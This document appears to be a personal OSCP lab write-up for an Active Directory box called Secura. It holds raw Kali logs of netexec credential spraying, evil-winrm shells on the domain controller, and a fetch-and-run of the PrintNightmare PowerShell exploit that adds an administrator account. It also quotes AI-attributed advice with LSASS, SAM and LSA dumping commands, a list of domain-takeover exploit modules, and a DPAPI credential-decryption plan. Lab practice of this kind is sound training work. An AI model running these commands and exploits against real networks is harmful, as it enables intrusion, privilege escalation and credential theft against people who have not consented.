SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:ERA) (signing:False) (SMBv1:None)
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:SECURE) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] DC01\charlotte:Game2On4.! STATUS_LOGON_FAILURE 
SMB         192.168.203.96  445    ERA              [-] ERA\charlotte:Game2On4.! STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [-] SECURE\charlotte:Game2On4.! STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                            
┌──(venv)─(kali㉿kali)-[~/Documents/peas]
└─$ netexec smb 192.168.203.95 192.168.203.96 192.168.203.97 -u charlotte -p 'Game2On4.!'             
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                             
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)                                                                                                                                                         
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [+] secura.yzx\charlotte:Game2On4.! 
SMB         192.168.203.95  445    SECURE           [+] secura.yzx\charlotte:Game2On4.! 
SMB         192.168.203.96  445    ERA              [+] secura.yzx\charlotte:Game2On4.! 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                            
┌──(venv)─(kali㉿kali)-[~/Documents/peas]
└─$ netexec smb 192.168.203.95 192.168.203.96 192.168.203.97 -u administrator -p 'Almost4There8.?' --local-auth
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                                   
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:SECURE) (signing:False) (SMBv1:None)
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:ERA) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] DC01\administrator:Almost4There8.? STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [-] SECURE\administrator:Almost4There8.? STATUS_LOGON_FAILURE 
SMB         192.168.203.96  445    ERA              [+] ERA\administrator:Almost4There8.? (Pwn3d!)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                            

└─$ netexec smb 192.168.203.95 192.168.203.96 192.168.203.97 -u administrator -p 'Almost4There8.?' 
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                             
SMB         192.168.203.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)                                                                                                                                                         
SMB         192.168.203.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:None)
SMB         192.168.203.97  445    DC01             [-] secura.yzx\administrator:Almost4There8.? STATUS_LOGON_FAILURE 
SMB         192.168.203.95  445    SECURE           [-] secura.yzx\administrator:Almost4There8.? STATUS_LOGON_FAILURE 
SMB         192.168.203.96  445    ERA              [-] secura.yzx\administrator:Almost4There8.? STATUS_LOGON_FAILURE 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

What claude suggested I do next.
**Dump ERA’s secrets as local admin** — SAM, LSA, and especially LSASS:

```
nxc smb 192.168.203.96 -u administrator -p 'Almost4There8.?' --local-auth --sam --lsa
nxc smb 192.168.203.96 -u administrator -p 'Almost4There8.?' --local-auth -M lsassy
```

`lsassy` rips credentials out of LSASS memory. You’re hunting for a **domain** credential — a `secura.yzx\someone` with a cleartext password or NT hash, ideally a Domain Admin. LSA secrets and cached domain creds (DCC2) are also worth scanning.

No good credentials harvested from above.

Since we know charlotte’s a domain user of .97 we can try winrm
```
└─$ nxc winrm 192.168.203.97 -u charlotte -p 'Game2On4.!'                          
WINRM       192.168.203.97  5985   DC01             [*] Windows 10 / Server 2016 Build 14393 (name:DC01) (domain:secura.yzx) 
WINRM       192.168.203.97  5985   DC01             [+] secura.yzx\charlotte:Game2On4.! (Pwn3d!)
└─$ evil-winrm -i 192.168.203.97 -u charlotte -p 'Game2On4.!
```

```
*Evil-WinRM* PS C:\users\charlotte\desktop> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
secura\charlotte S-1-5-21-3453094141-4163309614-2941200192-1104


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Machine is vulnerable to printnightmare
```
└─$ netexec smb 192.168.203.97 -u charlotte -p 'Game2On4.!' -M printnightmare                                  
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         192.168.203.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                                                                                                             
SMB         192.168.203.97  445    DC01             [+] secura.yzx\charlotte:Game2On4.! 
PRINTNIG... 192.168.203.97  445    DC01             Vulnerable, next step https://github.com/ly4k/PrintNightmare
```

We can use **Invoke-Nightmare (calebstewart’s PowerShell PoC):**

```bash
# Kali: grab it and serve it
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
python3 -m http.server 80
```

```
*Evil-WinRM* PS C:\users\charlotte\desktop> wget http://192.168.45.216/CVE-2021-1675.ps1 -OutFile CVE-2021-1675.ps1
*Evil-WinRM* PS C:\users\charlotte\desktop> . .\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\users\charlotte\desktop> Invoke-Nightmare -NewUser "pwned" -NewPassword "Password123!"
[+] created payload at C:\Users\TEMP\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_3d8f0626c408afea\Amd64\mxdwdrv.dll"
[+] added user pwned as local administrator
[+] deleting payload from C:\Users\TEMP\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\users\charlotte\desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Admin
Administrator
pwned
The command completed successfully.
```

```
└─$ evil-winrm -i 192.168.203.97 -u pwned -p 'Password123!'
```

Obtained DC.

Tried God potato, Sigma potato, printspoofer. All did not work.


## Closing 
From Claude:
These modules turn nxc into a quick vuln-and-loot scanner, and knowing the key ones saves huge time. First, how to list them yourself (they’re **per-protocol**):

bash

```bash
nxc smb -L      # SMB modules
nxc ldap -L     # LDAP modules
nxc winrm -L
nxc mssql -L
```

Here are the ones actually worth knowing, grouped by what they do:

**Critical AD / DC privesc vuln-checks (the “is this box instantly ownable” set):**

- `-M zerologon` — CVE-2020-1472. Resets the DC machine account → instant DA. One of the biggest.
- `-M nopac` — CVE-2021-42278/42287 (sAMAccountName spoofing) → DA from a normal user.
- `-M printnightmare` — the one you just ran.
- `-M ms17-010` — EternalBlue (older boxes).
- `-M smbghost` — CVE-2020-0796 (SMBv3).
- `-M petitpotam` — CVE-2021-36942, auth coercion (pairs with ADCS relay).

**Coercion / relay enablers (do they expose a trigger):**

- `-M spooler` — is the Print Spooler running? (enables printnightmare + coercion)
- `-M webdav` — is the WebClient service running? (enables HTTP coercion → relay)
- `-M coerce_plus` — checks multiple coercion vectors at once

**Credential looting (misconfig hunting — very OSCP-relevant):**

- `-M gpp_password` — GPP `cPassword` in SYSVOL (decryptable creds). Classic.
- `-M gpp_autologin` — autologon creds in GPP
- `-M laps` — read LAPS-managed local admin passwords (if your user can)
- `-M get-desc-users` _(ldap)_ — pulls the AD **description** field; admins stash passwords there shockingly often
- `-M lsassy` — dump LSASS remotely with admin creds (you used this idea on ERA)

**AD Certificate Services (increasingly common):**

- `-M adcs` _(ldap)_ — finds a CA and flags ESC-vulnerable templates (ESC1 etc.) → cert-based DA

**Local privesc / config checks:**

- `-M install_elevated` — AlwaysInstallElevated (MSI-as-SYSTEM)
- `-M enum_av` — what AV/EDR is running (plan your evasion)
- `-M maq` _(ldap)_ — MachineAccountQuota (needed for nopac/addcomputer)

**A practical OSCP enumeration reflex** once you have _any_ domain creds, run this trio to sweep for freebies:

bash

```bash
nxc smb <dc> -u <user> -p <pass> -M zerologon
nxc smb <dc> -u <user> -p <pass> -M nopac
nxc ldap <dc> -u <user> -p <pass> -M get-desc-users
nxc ldap <dc> -u <user> -p <pass> -M adcs
```

One honesty note about the exam itself: OffSec tends to steer the **OSCP exam** away from the one-shot DC CVEs (zerologon/nopac/printnightmare are often patched or out of scope there) and toward **misconfiguration + credential-reuse** chains — exactly the path you walked on Secura (stored creds → lateral → SeImpersonate/PrintNightmare). So weight your muscle memory toward `gpp_password`, `get-desc-users`, `adcs`, `laps`, and credential looting. The big CVE modules are still gold in the **challenge labs and PG**, and absolutely worth testing — just don’t bank on them for the exam.

Run `nxc smb -L` and `nxc ldap -L` once to see the full list on your build — then finish owning that DC. SigmaPotato or Invoke-Nightmare, your pick.



NOTES for the Box:
**The privilege ladder on a Windows/AD network:**

```
domain user  <  local admin (on one box)  <  NT AUTHORITY\SYSTEM (on one box)  <  Domain Admin (the whole domain)
```

What you have right now: Eric is **local admin on SECURE** — _one member workstation._ That is genuinely useful (it’s why your SAM/LSA dump worked), but notice two limits:

1. **It’s scoped to SECURE only.** The whole objective of this challenge is the **domain** — ending at DC01. Local admin on a single workstation is the _starting line_ of the AD portion, not the finish. You proved this yourself: you dumped every local cred on SECURE and **none of them reused** on ERA or the DC. So, for the purpose of moving _forward_, SECURE is already tapped out. Admin on a dead-end box doesn’t advance you.
2. **Local admin ≠ SYSTEM, and that gap matters here specifically.** This is the heart of your question. The reason the path wants `NT AUTHORITY\SYSTEM` isn’t “more power for its own sake” — it’s about what you need to **decrypt the loot.**

**Here’s the concrete “why SYSTEM”:** The briefing says the next step is cleartext creds stored in **RDCMan**. RDCMan (Remote Desktop Connection Manager) saves passwords **encrypted with DPAPI**, tied to the Windows account that saved them. To turn that encrypted blob back into a usable password, you need either:

- that user’s own login context/password, or
- **SYSTEM**, which can pull the machine’s DPAPI master keys and decrypt secrets belonging to _any_ user on the box.

Your Eric RDP session (even as local admin, filtered by UAC to a medium-integrity token) can’t just read another user’s DPAPI-protected secret. SYSTEM can. **That’s the purpose of the ManageEngine RCE** — the service runs as SYSTEM, so exploiting it drops you a SYSTEM shell, and _that_ context is what lets you crack open the RDCMan creds that unlock the next machine.

So the chain logic is: **RCE → SYSTEM → decrypt RDCMan creds → pivot to the next box.** Local-admin-Eric can’t shortcut past the DPAPI wall; SYSTEM is the key that fits it.